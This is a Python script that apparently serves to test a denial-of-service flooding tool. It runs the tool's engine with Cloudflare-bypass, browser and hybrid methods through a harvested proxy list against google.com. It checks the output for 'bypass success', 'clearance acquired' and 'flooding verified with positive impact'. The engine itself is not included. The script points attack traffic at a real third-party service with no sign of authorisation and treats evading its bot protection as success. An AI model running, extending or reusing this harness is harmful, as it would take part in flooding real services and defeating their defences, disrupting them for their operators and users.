import subprocess
import time
import sys
from pathlib import Path

TARGET = "https://google.com/"
METHODS = ["CFBUAM", "BROWSER", "HYBRID"]
PROXY_FILE = "auto_harvest.txt"

def run_detailed_test(method):
    print(f"\n{'#'*70}")
    print(f"### DETAILED TEST: {method} against {TARGET}")
    print(f"{'#'*70}")
    
    root_dir = Path(__file__).parent.parent
    python_exe = sys.executable
    candidates = [
        root_dir / ".venv" / "Scripts" / "python.exe",
        root_dir / ".venv" / "bin" / "python",
        root_dir / "venv" / "Scripts" / "python.exe",
        root_dir / "venv" / "bin" / "python",
    ]
    for candidate in candidates:
        if candidate.exists():
            python_exe = str(candidate)
            break
    cmd = [
        python_exe, "-u", "src/core/engine.py",
        method, TARGET, "0", "10", PROXY_FILE, "10", "120", "1",
        "--adaptive", "true",
        "--session-id", f"test_{method.lower()}_{int(time.time())}"
    ]
    
    print(f"[*] Command: {' '.join(cmd)}")
    
    start_t = time.time()
    # Using bufsize=1 and universal_newlines=True for real-time line buffering
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        encoding='utf-8',
        errors='replace'
    )
    
    found_success = False
    found_bypass = False
    
    try:
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                line_str = line.strip()
                print(f"  [LOG] {line_str}")
                
                if "BYPASS SUCCESS" in line_str.upper() or "CLEARANCE ACQUIRED" in line_str.upper():
                    found_bypass = True
                    print(f"\n[!!!] {method}: BYPASS ENGINE VERIFIED SUCCESSFUL")
                
                if "IMPACT:" in line_str and "OK:" in line_str:
                    # Check if OK count is > 0
                    ok_part = [p for p in line_str.split("|") if "OK:" in p]
                    if ok_part:
                        ok_count = int(ok_part[0].split(":")[1].strip().split(",")[0])
                        if ok_count > 0:
                            found_success = True
                            print(f"\n[!!!] {method}: FLOODING VERIFIED WITH POSITIVE IMPACT ({ok_count} hits)")
                
                # Stop after seeing positive impact or bypass success + some flooding
                if found_bypass and found_success:
                    print(f"\n[+] Method {method} confirmed working. Terminating test...")
                    break
            
            # Max time per method test: 150s (allowing for browser solve)
            if time.time() - start_t > 150:
                print(f"\n[!] Timeout reached for {method}.")
                break
    finally:
        process.terminate()
        try:
            process.wait(timeout=5)
        except:
            process.kill()

def main():
    print(f"Initializing Detailed Tactical Verification Sequence...")
    for m in METHODS:
        run_detailed_test(m)
        print("\n[*] Waiting for system cooldown (5s)...")
        time.sleep(5)
    print("\n[COMPLETE] All detailed tests finished.")

if __name__ == "__main__":
    main()
